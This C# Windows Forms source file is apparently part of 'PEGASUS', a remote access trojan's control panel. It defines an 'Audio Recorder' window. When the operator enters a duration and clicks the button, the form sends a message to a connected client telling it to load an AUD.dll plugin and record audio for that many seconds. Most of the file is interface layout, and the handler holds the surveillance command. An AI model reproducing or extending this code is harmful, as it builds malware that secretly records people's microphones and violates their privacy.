using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Algorithm;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Forms
{

	public class FormAudio : Form
	{
		private SoundPlayer SP = new SoundPlayer();

		private IContainer components;

		private System.Windows.Forms.Timer timer1;

		private Label label1;

		private Guna2PictureBox guna2PictureBox1;

		public Guna2GradientButton btnStartStopRecord;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2Panel guna2Panel1;

		private Label label2;

		private PictureBox pictureBox1;

		private Guna2Separator guna2Separator1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2TextBox textBox1;

		public PEGASUSMain F { get; set; }

		internal Clients ParentClient { get; set; }

		internal Clients Client { get; set; }

		public byte[] BytesToPlay { get; set; }

		public FormAudio()
		{
			InitializeComponent();
			base.MinimizeBox = false;
			base.MaximizeBox = false;
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		private void btnStartStopRecord_Click_1(object sender, EventArgs e)
		{
			if (textBox1.Text != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "audio";
				msgPack.ForcePathObject("Second").AsString = textBox1.Text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\AUD.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
				Thread.Sleep(100);
				btnStartStopRecord.Text = "Wait...";
				btnStartStopRecord.Enabled = false;
			}
			else
			{
				MessageBox.Show("Input seconds to record.");
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormAudio));
			timer1 = new System.Windows.Forms.Timer(components);
			label1 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			btnStartStopRecord = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label2 = new System.Windows.Forms.Label();
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			guna2Panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			timer1.Tick += new System.EventHandler(timer1_Tick);
			label1.AutoSize = true;
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(289, 100);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(47, 13);
			label1.TabIndex = 3;
			label1.Text = "seconds";
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(405, 12);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 6;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			btnStartStopRecord.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnStartStopRecord.BorderThickness = 1;
			btnStartStopRecord.CheckedState.Parent = btnStartStopRecord;
			btnStartStopRecord.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStartStopRecord.CustomImages.Parent = btnStartStopRecord;
			btnStartStopRecord.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnStartStopRecord.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStartStopRecord.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartStopRecord.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartStopRecord.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnStartStopRecord.DisabledState.Parent = btnStartStopRecord;
			btnStartStopRecord.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnStartStopRecord.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnStartStopRecord.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStartStopRecord.ForeColor = System.Drawing.Color.White;
			btnStartStopRecord.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStartStopRecord.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnStartStopRecord.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartStopRecord.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnStartStopRecord.HoverState.Parent = btnStartStopRecord;
			btnStartStopRecord.Location = new System.Drawing.Point(83, 119);
			btnStartStopRecord.Name = "btnStartStopRecord";
			btnStartStopRecord.ShadowDecoration.Parent = btnStartStopRecord;
			btnStartStopRecord.Size = new System.Drawing.Size(244, 30);
			btnStartStopRecord.TabIndex = 8;
			btnStartStopRecord.Text = "Start Recording";
			btnStartStopRecord.Click += new System.EventHandler(btnStartStopRecord_Click_1);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2Panel1.Controls.Add(guna2Separator1);
			guna2Panel1.Controls.Add(pictureBox1);
			guna2Panel1.Controls.Add(label2);
			guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
			guna2Panel1.Location = new System.Drawing.Point(0, 0);
			guna2Panel1.Name = "guna2Panel1";
			guna2Panel1.ShadowDecoration.Parent = guna2Panel1;
			guna2Panel1.Size = new System.Drawing.Size(446, 67);
			guna2Panel1.TabIndex = 9;
			guna2Panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-426, 61);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 13;
			guna2Separator1.UseTransparentBackground = true;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 42);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 12;
			pictureBox1.TabStop = false;
			label2.AutoSize = true;
			label2.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label2.Location = new System.Drawing.Point(168, 20);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(81, 19);
			label2.TabIndex = 11;
			label2.Text = "RECORD";
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			textBox1.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox1.DefaultText = "10";
			textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			textBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.DisabledState.Parent = textBox1;
			textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			textBox1.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textBox1.FocusedState.Parent = textBox1;
			textBox1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			textBox1.HoverState.Parent = textBox1;
			textBox1.Location = new System.Drawing.Point(83, 86);
			textBox1.Name = "textBox1";
			textBox1.PasswordChar = '\0';
			textBox1.PlaceholderText = "";
			textBox1.SelectedText = "";
			textBox1.SelectionStart = 2;
			textBox1.ShadowDecoration.Parent = textBox1;
			textBox1.Size = new System.Drawing.Size(200, 27);
			textBox1.TabIndex = 10;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(446, 192);
			base.Controls.Add(textBox1);
			base.Controls.Add(btnStartStopRecord);
			base.Controls.Add(guna2PictureBox1);
			base.Controls.Add(label1);
			base.Controls.Add(guna2Panel1);
			ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FormAudio";
			base.ShowIcon = false;
			Text = "Audio Recorder";
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			guna2Panel1.ResumeLayout(false);
			guna2Panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
